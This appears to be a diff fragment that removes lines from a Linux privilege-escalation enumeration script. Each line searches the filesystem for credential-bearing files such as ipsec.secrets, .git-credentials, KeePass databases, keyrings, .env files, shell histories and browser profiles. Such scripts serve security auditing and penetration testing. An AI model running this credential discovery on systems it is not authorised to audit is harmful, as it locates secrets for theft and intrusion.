-    PSTORAGE_ERLANG=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.erlang\.cookie$" | sort | uniq | head -n 70)
-    PSTORAGE_GMV_AUTH=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "gvm-tools\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_IPSEC=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "ipsec\.secrets$|ipsec\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_IRSSI=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.irssi$" | sort | uniq | head -n 70)
-    PSTORAGE_KEYRING=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "keyrings$|.*\.keyring$|.*\.keystore$|.*\.jks$" | sort | uniq | head -n 70)
-    PSTORAGE_FILEZILLA=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "filezilla$|filezilla\.xml$|recentservers\.xml$" | sort | uniq | head -n 70)
-    PSTORAGE_BACKUP_MANAGER=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "storage\.php$|database\.php$" | sort | uniq | head -n 70)
-    PSTORAGE_SPLUNK=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "passwd$" | sort | uniq | head -n 70)
-    PSTORAGE_GITLAB=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '/lib' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "secrets\.yml$|gitlab\.yml$|gitlab\.rm$" | sort | uniq | head -n 70)
-    PSTORAGE_PGP_GPG=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E 'README.gnupg' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.pgp$|.*\.gpg$|.*\.gnupg$" | sort | uniq | head -n 70)
-    PSTORAGE_CACHE_VI=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.swp$|.*\.viminfo$" | sort | uniq | head -n 70)
-    PSTORAGE_DOCKER=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "docker\.socket$|docker\.sock$|Dockerfile$|docker-compose\.yml$" | sort | uniq | head -n 70)
-    PSTORAGE_FIREFOX=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "\.mozilla$|Firefox$" | sort | uniq | head -n 70)
-    PSTORAGE_CHROME=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "google-chrome$|Chrome$" | sort | uniq | head -n 70)
-    PSTORAGE_OPERA=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "com\.operasoftware\.Opera$" | sort | uniq | head -n 70)
-    PSTORAGE_SAFARI=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "Safari$" | sort | uniq | head -n 70)
-    PSTORAGE_AUTOLOGIN=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "autologin$|autologin\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_FASTCGI=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "fastcgi_params$" | sort | uniq | head -n 70)
-    PSTORAGE_SNMP=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "snmpd\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_PYPIRC=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.pypirc$" | sort | uniq | head -n 70)
-    PSTORAGE_POSTFIX=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "postfix$" | sort | uniq | head -n 70)
-    PSTORAGE_CLOUDFLARE=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.cloudflared$" | sort | uniq | head -n 70)
-    PSTORAGE_HISTORY=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\..*_history\..*$" | sort | uniq | head -n 70)
-    PSTORAGE_HTTP_CONF=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "httpd\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_HTPASSWD=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.htpasswd$" | sort | uniq | head -n 70)
-    PSTORAGE_LDAPRC=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.ldaprc$" | sort | uniq | head -n 70)
-    PSTORAGE_ENV=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.env$" | sort | uniq | head -n 70)
-    PSTORAGE_MSMTPRC=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.msmtprc$" | sort | uniq | head -n 70)
-    PSTORAGE_INFLUXDB=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "influxdb\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_ZABBIX=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "zabbix_server\.conf$|zabbix_agentd\.conf$|zabbix$" | sort | uniq | head -n 70)
-    PSTORAGE_GITHUB=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.github$|\.gitconfig$|\.git-credentials$|\.git$" | sort | uniq | head -n 70)
-    PSTORAGE_SVN=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.svn$" | sort | uniq | head -n 70)
-    PSTORAGE_KEEPASS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.kdbx$|KeePass\.config.*$|KeePass\.ini$|KeePass\.enforced.*$" | sort | uniq | head -n 70)
-    PSTORAGE_FTP=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.ftpconfig$|ffftp\.ini$|ftp\.ini$|ftp\.config$|sites\.ini$|wcx_ftp\.ini$|winscp\.ini$|ws_ftp\.ini$" | sort | uniq | head -n 70)
-    PSTORAGE_BIND=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/var|^/usr|^/etc" | grep -E "bind$" | sort | uniq | head -n 70)
